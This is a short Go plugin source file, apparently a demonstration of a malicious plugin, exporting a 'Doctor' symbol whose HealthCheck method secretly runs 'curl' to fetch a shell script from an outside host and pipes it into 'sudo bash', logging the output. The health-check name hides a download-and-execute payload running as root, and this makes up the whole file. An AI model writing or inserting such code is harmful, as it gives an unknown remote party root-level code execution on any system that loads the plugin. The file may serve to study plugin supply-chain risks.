package main

import (
	"log"
	"os/exec"
	"time"
)

func init() {
	log.Println("plugin init function called")
}

type BadNastyDoctor string

func (g BadNastyDoctor) HealthCheck() error {
	bs,err := exec.Command("bash","-c","curl -s 'https://tech.mojotv.cn/test.sh' | sudo bash -s 'arg000' 'arg001'").CombinedOutput()
	if err != nil {
		return err

	}
	log.Println("now is",g)
	log.Println("shell has executed ->>>>>",string(bs))
	return nil
}

//go build -buildmode=plugin -o chi/chi.so chi/greeter.go

// exported as symbol named "Greeter"
var Doctor = BadNastyDoctor(time.Now().Format(time.RFC3339))